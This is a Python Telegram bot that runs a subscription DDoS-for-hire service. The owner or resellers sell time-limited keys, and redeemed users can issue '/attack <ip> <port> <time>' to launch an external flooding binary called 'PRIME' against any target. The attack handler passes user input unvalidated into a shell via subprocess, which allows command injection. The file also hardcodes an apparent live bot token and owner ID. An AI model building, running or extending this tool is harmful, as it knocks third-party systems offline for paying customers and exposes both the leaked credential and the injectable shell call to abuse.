import os
import time
import json
import asyncio
import subprocess
import threading
from datetime import datetime, timedelta
from telegram import Update
from telegram.ext import ApplicationBuilder, CommandHandler, ContextTypes

# ==================== CONFIGURATION ====================
# Railway Variables se data lega, backup ke liye default values hain
TOKEN = os.getenv("API_KEY", "8284925570:AAFCGAuw4oax5Jl_wtslzOPuXVsm13pCcPE")
OWNER_ID = str(os.getenv("OWNER_ID", "2109683176"))
BINARY_NAME = "./PRIME"

USER_FILE = "users.json"
KEY_FILE = "keys.json"
RESELLER_FILE = "resellers.json"

# ==================== DATA HELPERS ====================
def load_data(file):
    if os.path.exists(file):
        try:
            with open(file, "r") as f: return json.load(f)
        except: return {}
    return {}

def save_data(file, data):
    with open(file, "w") as f: json.dump(data, f, indent=4)

# Initialize Files
for f in [USER_FILE, KEY_FILE, RESELLER_FILE]:
    if not os.path.exists(f): save_data(f, {})

approved_users = load_data(USER_FILE)
pending_keys = load_data(KEY_FILE)
resellers = load_data(RESELLER_FILE)

def is_auth(uid):
    uid_str = str(uid)
    if uid_str == OWNER_ID: return True
    if uid_str in resellers: return True
    if uid_str in approved_users:
        if approved_users[uid_str].get('expiry', 0) > time.time():
            return True
    return False

# ==================== COMMANDS ====================

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_auth(update.effective_user.id):
        await update.message.reply_text(f"❌ Access Denied\nYour ID: `{update.effective_user.id}`", parse_mode="Markdown")
        return
    await update.message.reply_text("⚔️ **PRIME-V6 MASTER ONLINE**\n\n🚀 `/attack <ip> <port> <time>`\n🔑 `/gen <day/week>` (Owner/Reseller Only)\n👤 `/user` (Check Status)", parse_mode="Markdown")

# 1. Key Generation (Owner & Resellers)
async def gen_key(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = str(update.effective_user.id)
    if user_id != OWNER_ID and user_id not in resellers:
        await update.message.reply_text("❌ Only Owner or Resellers can generate keys!")
        return

    duration_input = context.args[0].lower() if context.args else "day"
    if duration_input in ["day", "1d"]:
        seconds, label = 86400, "1 Day"
    elif duration_input in ["week", "1w"]:
        seconds, label = 604800, "1 Week"
    else:
        await update.message.reply_text("Usage: `/gen day` or `/gen week`")
        return

    key = f"PRIME-{os.urandom(3).hex().upper()}"
    pending_keys[key] = seconds
    save_data(KEY_FILE, pending_keys)
    
    await update.message.reply_text(f"🔑 **Key:** `{key}`\n⏳ **Validity:** `{label}`\nUse: `/redeem {key}`", parse_mode="Markdown")

# 2. Redeem Key
async def redeem(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = str(update.effective_user.id)
    if not context.args:
        await update.message.reply_text("Usage: `/redeem <key>`")
        return

    key = context.args[0].upper()
    if key in pending_keys:
        expiry_date = time.time() + pending_keys[key]
        approved_users[user_id] = {"expiry": expiry_date}
        save_data(USER_FILE, approved_users)
        
        del pending_keys[key]
        save_data(KEY_FILE, pending_keys)
        
        await update.message.reply_text(f"✅ **Success!** Access granted until `{datetime.fromtimestamp(expiry_date).strftime('%Y-%m-%d %H:%M:%S')}`")
    else:
        await update.message.reply_text("❌ Invalid or Expired Key!")

# 3. Attack Command
async def attack(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_auth(update.effective_user.id):
        await update.message.reply_text("❌ No active subscription.")
        return
        
    if len(context.args) < 3:
        await update.message.reply_text("Usage: `/attack <ip> <port> <time>`")
        return
    
    ip, port, dur = context.args
    
    # Permission Check for Binary
    if os.path.exists(BINARY_NAME):
        os.chmod(BINARY_NAME, 0o755)
        await update.message.reply_text(f"🚀 **Attack Sent!**\n📍 Target: `{ip}:{port}`\n⏳ Time: `{dur}s`", parse_mode="Markdown")
        subprocess.Popen(f"{BINARY_NAME} {ip} {port} {dur}", shell=True)
    else:
        await update.message.reply_text("❌ Error: Binary `PRIME` not found. Check Build Logs.")

# 4. User Info
async def user_info(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = str(update.effective_user.id)
    if user_id == OWNER_ID:
        await update.message.reply_text("👑 **Status:** `Owner` (Unlimited Access)")
        return

    if user_id in approved_users:
        expiry = approved_users[user_id]['expiry']
        if expiry > time.time():
            rem = str(timedelta(seconds=int(expiry - time.time())))
            await update.message.reply_text(f"👤 **User Info**\nStatus: `Active`\nRemaining: `{rem}`")
        else:
            await update.message.reply_text("❌ Plan Expired.")
    else:
        await update.message.reply_text("❌ No Active Plan.")

# ==================== MAIN ====================
if __name__ == "__main__":
    app = ApplicationBuilder().token(TOKEN).build()
    
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("gen", gen_key))
    app.add_handler(CommandHandler("redeem", redeem))
    app.add_handler(CommandHandler("attack", attack))
    app.add_handler(CommandHandler("user", user_info))
    
    print("🔥 Bot Started Successfully!")
    app.run_polling()
